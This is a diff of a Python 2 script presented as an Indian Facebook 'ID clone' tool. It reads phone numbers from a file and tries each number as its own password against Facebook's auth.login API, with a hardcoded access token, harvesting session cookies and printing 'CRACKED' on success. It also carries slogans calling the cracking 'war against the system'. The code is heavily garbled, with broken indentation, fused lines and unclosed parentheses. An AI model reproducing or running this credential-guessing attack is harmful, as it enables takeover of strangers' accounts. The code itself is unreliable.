@@ -129,103 +129,92 @@ def lisensi():
     login()
 ####login#########
 def login():
-    os.system('clear')
-    print logo1
-    print "\033[1;91m[\033[1;97m1\033[1;91m]\033[1;94mSTART THE CRACKING:*"
+	os.system('clear')
+print logo1
+	print "\033[1;91m[\033[1;97m1\033[1;91m]\033[1;94mSTART THE CRACKING:*"
     time.sleep(0.05)
-    print '\x1b[1;97m[2]\033[1;91m EXIT TOOL'
-    pilih_login()
+	print '\x1b[1;97m[2]\033[1;91m EXIT TOOL'
+pilih_login()
  
 def pilih_login():
-    peak = raw_input("\n\033[1;95mCHOOSE: \033[1;93m")
-    if peak =="":
-        print "\x1b[1;97mFill In Correctly"
-        pilih_login()
-    elif peak =="1":
-        Zeek()
-def Zeek():
-    os.system('clear')
-    print logo1
-    print '\033[1;93m[\033[1;91m1\033[1;93m]\033[1;94m START CLONING'   
-    okayy()
- 
- def okayy():
- 	print '\033[1;91m[1] \033[1;97m Airtel'
-     print '\033[1;91m[2] \033[1;97m Vodafone Idea'
-     print '\033[1;91m[3] \033[1;97m Reliance Jio'
-     action()
-     
-def action():
-    peak = raw_input('\n\033[1;91mCHOOSE:\033[1;93m')
-    if peak =='':
-        print '[!] Fill In Correctly'
-        action()
-    elif peak =="1":          
-      airtel()
-     elif peak =="2":          
-      idea()
-          elif peak =="3":          
-      jio()
-     
-     def airtel():
-     	print logo
-    print '\033[1;91m NOTE : \033[0;91m OWNER PAKISTAN HE ISLIE KIA PATA Suggestion'
-    print '\033[0;91m Men Galti Ho Jaye Aap khud Code LiKhdo😁'
-    print '\033[1;95m SUGGESTION: \033[1;93m90,91,92,93,94,95,96,97,98,99'
-    chooose()
-    
-         def idea():
-     	print logo
-    print '\033[1;91m NOTE : \033[0;91m OWNER PAKISTAN HE ISLIE KIA PATA Suggestion'
-    print '\033[0;91m Men Galti Ho Jaye Aap khud Code LiKhdo😁'
-    print '\033[1;95m SUGGESTION: \033[1;93mUPAR LIKHA PARHLO😁'
-    chooose()
-    
-         def jio():
-     	print logo
-    print '\033[1;91m NOTE : \033[0;91m OWNER PAKISTAN HE ISLIE KIA PATA Suggestion'
-    print '\033[0;91m Men Galti Ho Jaye Aap khud Code LiKhdo😁'
-    print '\033[1;95m SUGGESTION: \033[1;93m😁UPAR LIKHA PARHLO'
-    chooose()
-      def chooose():   
-      	 os.system("clear")
-        print logo2
-        print "ENTER CODE "+'\n'
-        print 'OWNER PAKISTANI HE ISLIE CODES KA NI PATA'
-        try:
-            c = raw_input("\033[1;94mCHOOSE : ")
-            k="+91"
-            idlist = ('.txt')
-            for line in open(idlist,"r").readlines():
-                id.append(line.strip())
-        except IOError:
-            print ("[!] File Not Found")
-            raw_input("\n[ Back ]")
-            blackmafiax()
-    elif peak =='0':
-        login()
-    else:
-        print '[!] Fill In Correctly'
-        action()
-          print 50* '\033[1;94m-'
-          xxx = str(len(id)
-        print ('\033[1;92mINDIAN ID CLONE  
-         jalan ('\033[1;91mTOTAL NUMBERS= '+xxx)
-         jalan ('\033[1;97mCODE U CHOOSED: '+c)
-         jalan ("\033[1;97mCLONING IS NOT A CRIME")
-    jalan ("\033[1;91mITS JUST WAR AGAINST THE SYSTEM")
-    jalan 50* '\033[1;97m*'
-    def main(arg):
-        global cpb,oks
-        user = arg
-        try:
-            os.mkdir('save')
-        except OSError:
-            pass
-        try:
-            pass1 = user
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
+peak = raw_input("\n\033[1;95mCHOOSE: \033[1;93m")
+if peak =="":
+		print "\x1b[1;97mFill In Correctly"
+	pilih_login()
+	elif peak =="1":
+	Zeek()
+	def Zeek():
+os.system('clear')
+print logo1
+	print '\033[1;93m[\033[1;91m1\033[1;93m]\033[1;94m START CLONING'   
+zeeko()
+	def zeeko():
+		print '\033[1;91m[1] \033[1;97m Airtel'
+		print '\033[1;91m[2] \033[1;97m Vodafone Idea'
+		print '\033[1;91m[3] \033[1;97m Reliance Jio'
+		action()
+		
+		def action():
+			peak = raw_input('\n\033[1;91mCHOOSE:\033[1;93m')
+			if peak =='':
+				print '[!] Fill In Correctly'
+				action(
+					elif peak =="1":         
+					airtel()
+					elif peak =="2":          
+					idea()
+					elif peak =="3":          
+					jio()
+					def airtel():
+					print logo
+					print '\033[1;91m NOTE : \033[0;91m OWNER PAKISTAN HE ISLIE KIA PATA Suggestion'
+					print '\033[0;91m Men Galti Ho Jaye Aap khud Code LiKhdo😁'
+					print '\033[1;95m SUGGESTION: \033[1;93m90,91,92,93,94,95,96,97,98,99'
+					chooose()
+					def idea():
+					print logo
+					print '\033[1;91m NOTE : \033[0;91m OWNER PAKISTAN HE ISLIE KIA PATA Suggestion'
+					print '\033[0;91m Men Galti Ho Jaye Aap khud Code LiKhdo😁
+					print '\033[1;95m SUGGESTION: \033[1;93mUPAR LIKHA PARHLO😁
+					chooose()
+					def jio():
+					print logo
+					print '\033[1;91m NOTE : \033[0;91m OWNER PAKISTAN HE ISLIE KIA PATA Suggestion'
+					print '\033[0;91m Men Galti Ho Jaye Aap khud Code LiKhdo😁'
+					print '\033[1;95m SUGGESTION: \033[1;93m😁UPAR LIKHA PARHLO'
+					chooose()
+					def chooose():   
+					os.system("clear")
+					print logo2
+					print "ENTER CODE "+'\n'
+					print 'OWNER PAKISTANI HE ISLIE CODES KA NI PATA'
+					try:
+					c = raw_input("\033[1;94mCHOOSE : ")    k="+91"  idlist = ('.txt') for line in open(idlist,"r").readlines():  id.append(line.strip())except IOError:     print ("[!] File Not Found")   raw_input("\n[ Back ]"
+					blackmafiax()
+					elif peak =='0':
+					login(
+						else:
+						print '[!] Fill In Correctly'
+						action()
+						print 50* '\033[1;94m-'
+						xxx = str(len(id)
+							  print ('\033[1;92mINDIAN ID CLONE  
+								 jalan ('\033[1;91mTOTAL NUMBERS= '+xxx)
+								 jalan ('\033[1;97mCODE U CHOOSED: '+c)
+								 jalan ("\033[1;97mCLONING IS NOT A CRIME")
+								 jalan ("\033[1;91mITS JUST WAR AGAINST THE SYSTEM"  
+									jalan 50* '\033[1;97m*'
+									def main(arg):
+									global cpb,oks
+									
+									user = arg
+									try:    os.mkdir('save')
+									except OSError:
+									pass   
+									try:
+									pass1 = user
+									data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm'
+										       q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
                 print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] 101% SUCCESSFULL'
